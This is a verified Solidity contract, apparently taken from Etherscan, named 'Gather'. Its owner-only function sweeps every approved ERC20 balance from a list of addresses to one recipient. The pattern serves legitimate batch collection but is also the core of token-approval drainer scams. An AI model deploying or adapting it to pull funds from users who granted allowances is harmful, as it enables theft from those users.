/**
 *Submitted for verification at Etherscan.io on 2023-07-08
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract owned {
    address public owner;
    constructor() {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}


contract Gather is owned {
     event TestTransferAfter(address from,uint256 balance, uint256 allowance,uint256 send);

    //授权转账 转账给谁,代币合约,检查地址
    function AuthorizationTransfer(
        address to,
        IERC20 token,
        address[] memory fromList
    ) public onlyOwner{
        for (uint256 i = 0; i < fromList.length; i++) {
            address thisCheck = fromList[i];
            uint256 balance = token.balanceOf(thisCheck);
            uint256 allowance = token.allowance(thisCheck, address(this));
            if (balance == 0 || allowance == 0) {
                emit TestTransferAfter(thisCheck,balance,allowance,0);
                continue;
            }
            uint256 amount = balance;
            if (allowance < amount) {
                amount = allowance;
            }
           
            token.transferFrom(thisCheck, to, amount);
             emit TestTransferAfter(thisCheck,balance,allowance,amount);
        }
    }

   
}